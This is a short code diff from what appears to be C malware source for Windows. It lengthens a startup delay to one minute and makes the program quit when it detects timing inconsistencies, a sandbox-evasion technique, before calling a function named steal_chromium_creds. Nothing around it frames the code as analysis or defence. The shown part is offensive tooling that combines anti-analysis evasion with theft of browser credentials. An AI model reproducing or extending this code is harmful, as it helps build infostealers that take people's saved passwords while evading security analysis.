@@ -17,7 +17,13 @@ int main(void) {
   // Allows us to print non-ASCII characters for debug
   SetConsoleOutputCP(CP_UTF8);
 
-  delay_execution(100);
+  // 1 minute
+  if (delay_execution(60000) == EXIT_FAILURE) {
+#ifdef DEBUG
+    fprintf(stderr, "Timing inconsistencies while delaying execution");
+#endif
+    return EXIT_FAILURE;
+  }
 
   hello();
   steal_chromium_creds();
